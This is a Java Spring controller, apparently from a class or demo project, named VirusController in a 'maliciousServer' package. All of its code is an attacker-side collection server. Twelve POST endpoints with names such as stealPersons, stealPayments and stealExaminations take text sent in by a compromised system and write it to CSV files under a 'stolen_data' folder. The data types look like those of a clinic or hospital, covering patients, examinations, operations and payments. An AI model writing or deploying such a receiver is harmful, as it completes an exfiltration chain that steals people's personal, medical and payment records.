package com.maliciousServer.controller;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping(value = "virus")
public class VirusController {

	
	@RequestMapping(value = "addresses", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealAddresses(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/addresses.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "examinations", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealExaminations(@RequestBody String content) throws IOException {


		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/examinations.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "operations", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealOperations(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/operations.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "payments", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealPayments(@RequestBody String content) throws IOException {
		
		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		File f = new File("stolen_data/payments.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "permissions", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealPermissions(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/permissions.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "persons", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealPersons(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();		
		
		File f = new File("stolen_data/persons.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "records", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRecords(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/records.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "roles", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRoles(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/roles.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "role_members", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRoleMembers(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/role_members.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "role_permissions", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRolePemissions(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/role_permissions.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "rooms", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRooms(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/rooms.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}
	
	@RequestMapping(value = "room_schedules", method = RequestMethod.POST, consumes = "text/plain")
	public ResponseEntity<Void> stealRoomSchedules(@RequestBody String content) throws IOException {

		File dir = new File("stolen_data");
		
		if (!dir.exists())
			dir.mkdir();
		
		File f = new File("stolen_data/room_schedules.csv");
		f.createNewFile();

		PrintWriter pw = new PrintWriter(f);
		pw.write(content);

		pw.close();

		return new ResponseEntity<>(HttpStatus.OK);
	}

}
